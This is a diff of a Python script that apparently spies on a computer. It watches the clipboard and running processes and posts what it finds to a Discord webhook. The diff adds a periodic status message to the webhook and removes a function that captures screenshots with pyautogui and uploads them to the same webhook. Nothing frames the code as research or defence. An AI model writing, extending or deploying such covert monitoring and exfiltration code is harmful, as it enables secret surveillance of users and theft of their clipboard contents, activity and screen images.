@@ -144,11 +144,11 @@ def monitor_clipboard():
 
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
-
 def monitor_processes():
     running_processes = set()
     first_check = True  # Flag to handle the first delay
-    
+    last_check_time = time.time()  # Track time of the last process check
+
     while True:
         current_processes = set(p.name() for p in psutil.process_iter())
         new_processes = current_processes - running_processes
@@ -158,6 +158,12 @@ def monitor_processes():
         if first_check:
             time.sleep(15)  # Initial delay of 15 seconds
             first_check = False  # Disable the first check flag
+
+        # If no new processes have been detected for 2 seconds, send a message
+        if not new_processes and (time.time() - last_check_time) >= 2:
+            message = "No new processes detected in the last 2 seconds"
+            send_to_webhook(message)
+            last_check_time = time.time()  # Reset the last check time
 
         for proc in new_processes:
             message = f"Started: {proc}"
@@ -170,40 +176,6 @@ def monitor_processes():
         running_processes = current_processes
         time.sleep(2)  # Check every 2 seconds after the first check
 
-def send_debug_message(message):
-    """Send debug message to the Discord webhook."""
-    payload = {"content": message}
-    try:
-        response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code == 200:
-            print("Debug message sent successfully.")
-        else:
-            print(f"Failed to send debug message. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"Error sending debug message to webhook: {e}")
-
-def take_and_send_screenshot():
-    """Takes a screenshot and sends it to the Discord webhook."""
-    send_debug_message("Taking screenshot...")
-    screenshot = pyautogui.screenshot()
-    send_debug_message("Screenshot taken. Saving...")
-    
-    img_bytes = io.BytesIO()
-    screenshot.save(img_bytes, format='PNG')
-    img_bytes.seek(0)
-    
-    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-    files = {'file': (f'screenshot_{timestamp}.png', img_bytes, 'image/png')}
-    
-    try:
-        send_debug_message("Sending screenshot...")
-        response = requests.post(WEBHOOK_URL, files=files)
-        if response.status_code == 200:
-            send_debug_message("Screenshot sent successfully.")
-        else:
-            send_debug_message(f"Failed to send screenshot. Status code: {response.status_code}")
-    except Exception as e:
-        send_debug_message(f"Error sending screenshot: {e}")
 
 # Start process monitoring in a separate thread
 process_thread = threading.Thread(target=monitor_processes, daemon=True)
